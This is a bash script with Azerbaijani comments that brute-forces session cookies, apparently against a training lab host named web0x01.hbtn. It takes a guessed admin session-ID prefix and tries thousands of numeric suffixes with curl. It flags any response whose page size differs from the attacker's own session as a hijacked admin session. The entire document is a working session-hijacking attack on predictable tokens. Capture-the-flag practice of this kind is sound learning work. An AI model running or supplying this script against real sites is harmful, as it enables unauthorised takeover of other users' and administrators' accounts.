#!/bin/bash

URL="http://web0x01.hbtn/a1/hijack_session/"
# Sənin işləyən sessiyan (ölçü götürmək üçün)
MY_SESSION="69db2d7f-a86a-4a55-a99-8418801-17686828893"
# Adminin ehtimal olunan ID-si
ADMIN_PREFIX="69db2d7f-a86a-4a55-a99-8418802-176868"

# 1. Öz səhifənin ölçüsünü tapırıq
MY_SIZE=$(curl -s -b "hijack_session=$MY_SESSION" $URL | wc -c)
echo "[*] Sizin səhifənin ölçüsü: $MY_SIZE bayt"
echo "[*] Fərqli ölçülü səhifələr axtarılır..."

# 2. Daha geniş aralıqda (28000-dən 30000-ə qədər) yoxlayırıq
for i in {28000..30000}
do
    COOKIE_VALUE="${ADMIN_PREFIX}${i}"
    
    # Səhifəni yükləyirik və ölçüsünü alırıq
    CURRENT_SIZE=$(curl -s -b "hijack_session=$COOKIE_VALUE" $URL | wc -c)

    # Əgər ölçü bizimkindən fərqlidirsə və səhifə boş deyilsə (məs. 0 deyil)
    if [ "$CURRENT_SIZE" -ne "$MY_SIZE" ] && [ "$CURRENT_SIZE" -gt 0 ]; then
        echo -e "\n[!] TAPILDI! Ölçü: $CURRENT_SIZE bayt"
        echo "[+] ID: $COOKIE_VALUE"
        # Tapanda dayanmaq istəyirsənsə 'break' saxla, hamısını görmək istəyirsənsə sil
        break 
    fi

    # Proqres bar kimi göstərmək üçün
    if (( $i % 50 == 0 )); then
        echo -ne "Yoxlanılır: $i / 30000 \r"
    fi
done
